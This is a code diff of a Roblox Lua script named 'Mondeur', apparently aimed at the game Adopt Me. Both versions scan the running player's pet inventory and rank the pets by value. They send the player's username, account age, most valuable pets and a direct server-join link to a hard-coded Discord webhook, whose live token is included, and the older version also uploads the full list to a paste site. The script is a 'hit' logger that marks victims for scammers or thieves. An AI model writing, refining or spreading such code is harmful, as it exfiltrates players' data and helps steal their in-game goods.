@@ -1,101 +1,82 @@
-
-if _G.__MondeurPhaseOne then return end
-_G.__MondeurPhaseOne = true
+-- [[ MONDEUR FAST PHASE 1 ]] --
+print("Mondeur: Initializing Phase 1...")
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
 
-local Fsys = ReplicatedStorage:WaitForChild("Fsys", 999)
-local API = ReplicatedStorage:WaitForChild("API", 999)
-local GetInvAPI = API:WaitForChild("InventoryAPI/GetInventory", 999)
+-- Fast Load Check
+local Fsys = ReplicatedStorage:FindFirstChild("Fsys")
+if not Fsys then 
+    print("Mondeur: Waiting for Fsys...")
+    Fsys = ReplicatedStorage:WaitForChild("Fsys", 30) 
+end
 
 local Fsys2 = require(Fsys)
-local load = Fsys2.load
-local InventoryDB = load("InventoryDB")
+local InventoryDB = Fsys2.load("InventoryDB")
+print("Mondeur: Modules Loaded.")
 
-local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
-
-local function uploadLog(pets)
-    if not requestFunc then return nil end
-    local logData = "=== MONDEUR INVENTORY LOG ===\nPlayer: " .. LocalPlayer.Name .. "\n------------------------------\n"
-    for i, p in ipairs(pets) do
-        logData = logData .. "[" .. i .. "] " .. p.name .. " | Value: " .. tostring(p.value) .. "\n"
-    end
-    
-    local ok, res = pcall(function()
-        return requestFunc({
-            Url = "https://sourceb.in/api/bins",
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({files = {{content = logData}}})
-        })
+-- High-Speed Scan
+local function execute_hit()
+    print("Mondeur: Scanning Inventory...")
+    local ok, inv = pcall(function() 
+        return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() 
     end)
-    
-    if ok and res and res.StatusCode == 200 then
-        local data = HttpService:JSONDecode(res.Body)
-        if data and data.key then return "https://srcb.in/" .. data.key end
+
+    if not ok or not inv then 
+        print("Mondeur: Failed to get inventory.")
+        return 
     end
-    return nil
-end
 
-local function sendWebhook(pets, totalVal, totalCount)
-    if not requestFunc then return end
-    
-    local binUrl = uploadLog(pets)
-    local lootText = ""
-    for i, p in ipairs(pets) do
-        if i > 25 then break end
-        lootText = lootText .. "> " .. p.name .. " : " .. tostring(p.value) .. "\n"
-    end
-    if lootText == "" then lootText = "Empty" end
-
-    local p_info = "User: " .. LocalPlayer.Name .. "\nDisplay: " .. LocalPlayer.DisplayName .. "\nAge: " .. tostring(LocalPlayer.AccountAge) .. " Days"
-    local v_stats = "Points: " .. tostring(totalVal) .. "\nPets: " .. tostring(totalCount)
-    local s_link = "[Join App](roblox://placeID=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId) .. ")"
-    local b_link = binUrl and "[View Log](" .. binUrl .. ")" or "Log Failed"
-
-    local payload = HttpService:JSONEncode({
-        username = "Mondeur",
-        embeds = {{
-            title = "Mondeur Hit",
-            color = 3447003,
-            fields = {
-                {name = "Player Info", value = "```\n" .. p_info .. "\n```", inline = false},
-                {name = "Stats", value = "```\n" .. v_stats .. "\n```", inline = true},
-                {name = "Top Loot", value = "```\n" .. lootText .. "```", inline = false},
-                {name = "Links", value = s_link .. " | " .. b_link, inline = false}
-            }
-        }}
-    })
-
-    pcall(function()
-        requestFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
-    end)
-end
-
-task.spawn(function()
-    task.wait(3) 
-    local ok, inv = pcall(function() return GetInvAPI:InvokeServer() end)
-    if not ok or not inv then return end
-
-    local p_list = {}
-    local t_val = 0
-    local t_count = 0
-
-    for id, item in pairs(inv) do
+    local pets = {}
+    local totalVal = 0
+    for _, item in pairs(inv) do
         if item.Kind == "Pet" then
-            t_count = t_count + 1
             local db = InventoryDB.pets[item.id]
-            local v = (item.properties and item.properties.value) or 0
-            table.insert(p_list, {name = (db and db.name) or item.id, value = v})
-            t_val = t_val + v
+            local val = (item.properties and item.properties.value) or 0
+            table.insert(pets, {name = (db and db.name) or item.id, value = val})
+            totalVal = totalVal + val
         end
     end
+    table.sort(pets, function(a, b) return a.value > b.value end)
+    print("Mondeur: Found " .. #pets .. " pets. Total: " .. totalVal)
 
-    table.sort(p_list, function(a, b) return a.value > b.value end)
-    sendWebhook(p_list, t_val, t_count)
-end)
+    -- Webhook Design (Clean & Direct)
+    local lootLines = ""
+    for i = 1, 15 do
+        if not pets[i] then break end
+        lootLines = lootLines .. "⭐ **" .. pets[i].name .. "** — `" .. pets[i].value .. "`\n"
+    end
+
+    local payload = {
+        username = "Mondeur Hub | Hit",
+        embeds = {{
+            title = "MondeurOnTop • ADM Hit [ 🌊 ]",
+            color = 3447003,
+            description = "👤 **User:** " .. LocalPlayer.Name .. "\n📅 **Age:** " .. LocalPlayer.AccountAge .. " Days\n💰 **Total Pts:** " .. totalVal,
+            fields = {
+                {name = "📦 **Top Items**", value = (lootLines ~= "" and lootLines or "None"), inline = false},
+                {name = "🌐 **Server**", value = "[**Join Server**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")", inline = true}
+            },
+            footer = {text = "Mondeur Fast Mode | " .. os.date("%X")}
+        }}
+    }
+
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if request then
+        print("Mondeur: Sending Webhook...")
+        local res = request({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        print("Mondeur: Webhook Response: " .. (res and res.StatusCode or "No Response"))
+    end
+end
+
+-- Execute
+task.spawn(execute_hit)
